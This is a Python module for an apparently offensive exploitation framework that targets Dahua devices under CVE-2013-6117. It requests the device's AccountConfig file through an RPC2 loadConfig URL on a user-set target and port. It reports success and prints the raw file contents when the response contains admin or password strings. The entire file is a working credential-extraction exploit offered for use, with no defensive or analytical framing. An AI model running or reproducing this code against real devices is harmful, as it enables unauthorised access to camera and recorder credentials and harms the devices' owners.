import httpx
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "dahua/cve_2013_6117_attack"
        self.description = "Exploit module to extract raw configuration and user credentials from Dahua devices (CVE-2013-6117)."
        self.type = "attack"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "37777"}
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        
        # Requête de force sur l'URI d'accès au fichier de configuration système (ConfigPrivilege)
        url = f"http://{target}:{port}/RPC2/loadConfig?File=/configs/AccountConfig"
        
        try:
            async with httpx.AsyncClient(timeout=6.0, verify=False) as client:
                print("\033[1;33m[*] Tentative d'extraction du fichier AccountConfig...\033[0m")
                response = await client.get(url)
                
                if response.status_code == 200 and ("admin" in response.text or "password" in response.text.lower()):
                    return {
                        "success": True,
                        "details": f"Credentials file leaked successfully. Raw output:\n{response.text.strip()}"
                    }
                else:
                    return {
                        "success": False,
                        "details": f"Exploit payload sent, but server denied access or returned unreadable content (Status: {response.status_code})."
                    }
        except Exception as e:
            return {"success": False, "error": str(e)}
